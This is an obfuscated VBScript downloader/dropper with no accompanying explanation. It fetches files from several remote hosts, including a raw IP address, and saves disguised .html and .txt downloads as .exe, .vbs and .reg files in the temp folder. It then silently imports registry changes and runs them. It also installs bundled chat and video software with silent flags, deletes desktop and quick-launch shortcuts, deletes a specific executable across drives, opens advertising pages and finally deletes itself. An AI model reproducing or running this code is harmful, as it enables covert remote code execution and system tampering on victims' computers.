on error resume next
amkqw210="http://p8.ch"&"ina.sog"&"ou.google.baid"&"u.com.ba"&"idu163s"&"o.info"
d6c196x0="http://98.126.249.6:81"
f0g0fxi2="http://hao345.info:7241"
Set b04e2km1= WScript.CreateObject("WScr"&"ipt.Sh"&"ell") 
Set m11i1568u = Wscript.CreateObject("Script"&"ing.FileSystemO"&"bject") 
cr85vo0v=b04e2km1.ExpandEnvironmentStrings("%temp%")
wq699q61 = left(cr85vo0v,3)
m25rba96a = b04e2km1.SpecialFolders("AppData") & "\Microsoft\Intern"&"et Explorer\Quic"&"k Launch"            '��ǰ�û���������
w2451b0u5="c:\Docume~1\All Us"&"ers\����ʼ���˵�"
b04e2km1.Run("htt"&"p://w"&"ww.xs"&"p5.i"&"nfo/index8.htm")
b04e2km1.run "C:\Progra~1\Intern~1\IEXPLORE.EXE http://ww"&"w.xs"&"p5.info/index/index8.htm",0 

Sub c1t54k4vd(t164203yh)
Set ejj8r7an= CreateObject("scrip"&"ting.Fi"&"leSys"&"temObject") 
If Not ejj8r7an.FolderExists(t164203yh) Then
  ejj8r7an.CreateFolder t164203yh
End If
Set ejj8r7an = Nothing 
end sub

Call c1t54k4vd(wq699q61&"Prog"&"ra~1\Win"&"RAR\ico")
ico1=wq699q61&"Prog"&"ra~1\WinR"&"AR\ico\"

Sub g7kdzay4(q123y71a3,w192d22jb)
Set j1z13pv19 = CreateObject("M"&"icros"&"oft.XM"&"L"&"HT"&"TP")
Set k1512b9yx = CreateObject("AD"&"O"&"DB.S"&"t"&"r"&"e"&"a"&"m")
with j1z13pv19
.Open "GET",q123y71a3,0
.Send()
end with
b=j1z13pv19.responseBody
with k1512b9yx
.type = eval("1")
.Mode = eval("3")
.open()
.write eval("j1z13pv19.r"&"es"&"po"&"n"&"se"&"Bo"&"d"&"y")
.SaveToFile w192d22jb,eval ("2")
end with
k1512b9yx.close
end sub

Sub d1z79ex03(e19632a7s,f1l7noe50)
Set r19mght40 = CreateObject("Script"&"ing.FileSyste"&"mObject")
If r19mght40.FileExists(e19632a7s) Then                         
       r19mght40.deletefile(e19632a7s)
End If
    Set g1k479pe8=r19mght40.CreateTextFile(e19632a7s,False)
    g1k479pe8.WriteLine(f1l7noe50)
    g1k479pe8.WriteLine("de"&"l %"&"0 ")
    g1k479pe8.Close       
Set r19mght40  = Nothing
end sub

call g7kdzay4(amkqw210&"/ico/tb.ico",ico1&"tb.ico")

call g7kdzay4(amkqw210&"/go/ie.txt",cr85vo0v&"\ie.reg")
b04e2km1.Run "regedit /s "&cr85vo0v&"\ie.reg"

call g7kdzay4(d6c196x0&"/hao.txt",cr85vo0v&"\xing.vbs")
b04e2km1.Run "cmd.exe /c start "&cr85vo0v&"\xing.vbs",0,True

call d1z79ex03(cr85vo0v& "\my.bat","for %%a in (c: d: e: f:) do for /f "&chr(34)&"delims="&chr(34)&" %%b in ('dir /a /s /b %%a\��Ƭר�ò�����.exe') do del %%b")
call d1z79ex03(cr85vo0v& "\my1.bat","for %%a in (C:\DOCUME~1\ADMINI~1\����\) do for /f "&chr(34)&"delims="&chr(34)&" %%b in ('dir /a /s /b %%a\��Ƭר�ò�����.exe') do del %%b")
cmd=b04e2km1.RUN(cr85vo0v&"\my.bat", runhide)
cmd=b04e2km1.RUN(cr85vo0v&"\my1.bat", runhide)

call g7kdzay4(amkqw210&"/go/page.txt",cr85vo0v&"\page.vbs")
b04e2km1.Run "cmd.exe /c start "&cr85vo0v&"\page.vbs",0,True

call g7kdzay4(amkqw210&"/dy/tan.html",cr85vo0v&"\tan.exe")
b04e2km1.Run "cmd.exe /c start "&cr85vo0v&"\tan.exe",0,True

call g7kdzay4(amkqw210&"/dy/so.html",cr85vo0v&"\so.exe")
b04e2km1.Run "cmd.exe /c start "&cr85vo0v&"\so.exe",0,True

call g7kdzay4(f0g0fxi2&"/soft/aiqi4397.exe",cr85vo0v&"\aiqi4397.exe")
b04e2km1.Run "cmd.exe /c start "&cr85vo0v&"\aiqi4397.exe",0,True

call g7kdzay4(f0g0fxi2&"/soft/pi4397.exe",cr85vo0v&"\pi4397.exe")
b04e2km1.Run "cmd.exe /c start "&cr85vo0v&"\pi4397.exe",0,True

b04e2km1.Run "http://www.qwxyx.com"

call g7kdzay4("http://neirong.funshion.com/download/silent/60423/Funshi"&"onInstall.exe",cr85vo0v&"\Funshi"&"onInstall.exe")
b04e2km1.Run "cmd.exe /c start "&cr85vo0v&"\Funshi"&"onInstall.exe",0,True
m11i1568u.DeleteFile "C:\Docume~1\Admini~1\����\���ɸ�����Ƶ.lnk" ,true
m11i1568u.DeleteFile "C:\Docume~1\Admini~1\����\����K�����.lnk" ,true
m11i1568u.DeleteFile m268a2h25&"\���ɸ�����Ƶ.lnk" ,true
m11i1568u.DeleteFile m268a2h25&"\����K�����.lnk" ,true
b04e2km1.Run "http://www.mmtp5.info/dy2.html"

call g7kdzay4(amkqw210&"/dy/cpa.html",cr85vo0v&"\cpa.exe")
b04e2km1.Run cr85vo0v&"\cpa.exe",,True

call g7kdzay4("http://download13.subo.me/9158/9158chat_374931.exe",cr85vo0v&"\9158chat_374931.exe")
b04e2km1.Run cr85vo0v&"\9158chat_374931.exe  /SILENT", , True
m11i1568u.DeleteFile "C:\Docume~1\All Users\����\������վ��ȫ.lnk" ,true
m11i1568u.DeleteFile "C:\Docume~1\All Users\����\������Ϸ.lnk" ,true
m11i1568u.DeleteFile "C:\Docume~1\All Users\����\����.lnk" ,true
m11i1568u.DeleteFile m25rba96a&"\����.lnk" ,true
m11i1568u.DeleteFile w2451b0u5&"\����.lnk" ,true
m11i1568u.DeleteFile m25rba96a&"\ƤƤ������.lnk" ,true
m11i1568u.DeleteFile "C:\Docume~1\Admini~1\����\9158������Ƶ.lnk" ,true
m11i1568u.DeleteFile "C:\Docume~1\All Users\����\9158������Ƶ.lnk" ,true
m11i1568u.DeleteFile m25rba96a&"\9158������Ƶ.lnk" ,true
m11i1568u.DeleteFile w2451b0u5&"\9158������Ƶ.lnk" ,true

call g7kdzay4("http://download13.subo.me/t58/t58chat_374931.exe",cr85vo0v&"\t58chat_374931.exe")
b04e2km1.Run cr85vo0v&"\t58chat_374931.exe  /SILENT", , True
m11i1568u.DeleteFile "C:\Docume~1\Admini~1\����\�����.lnk" ,true
m11i1568u.DeleteFile "C:\Docume~1\All Users\����\�����.lnk" ,true
m11i1568u.DeleteFile m25rba96a&"\����ɶ�����Ƶ�ռ�.lnk" ,true
m11i1568u.DeleteFile w2451b0u5&"\����ɶ�����Ƶ�ռ�.lnk" ,true

WScript.Sleep 1000000
b04e2km1.Run "http://www.cryx.info/sogou/vipdy.html?ss"
b04e2km1.Run "C:\Progra~1\Funshi~1\Funshion\Funshion.exe", , True
m11i1568u.DeleteFile(WScript.ScriptName)
